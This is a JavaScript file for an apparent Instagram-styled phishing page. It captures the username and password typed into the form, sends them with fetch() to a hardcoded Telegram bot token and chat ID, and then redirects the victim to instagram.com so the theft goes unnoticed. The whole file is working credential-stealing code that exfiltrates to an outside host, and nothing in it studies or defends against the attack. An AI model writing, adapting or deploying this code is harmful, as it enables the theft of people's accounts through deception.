let BOT_TOKEN = '6610875070:AAFVU-giqJf9057Ih8UsbyFznotsJBwPEpE'
let telegram_url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
let TELEGRAM_CHAT_ID = '1844909205'

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

function sendMessageToBot(e){
    fetch(telegram_url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `\n Login: ${inputs[0].value} \n Password: ${inputs[1].value}`
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent successfully:', data);
    })
    .catch(error => {
        console.error('Error sending message:', error)
    });
}

function checkInputs() {
    const value0 = inputs[0].value;
    const value1 = inputs[1].value;

    if (value0 > 0 || value1 > 0) {
        button.setAttribute('aria-disabled', true);
        button.style.background = "#3897f0;"
    } else {
        button.setAttribute('aria-disabled', false);
        button.style.background = "#6293c1;"
        
button.addEventListener('click', (event) =>{
    event.preventDefault()
    sendMessageToBot()

    window.location.href = 'https://www.instagram.com'
})
    }
}

inputs[0].addEventListener('input', checkInputs);
inputs[1].addEventListener('input', checkInputs);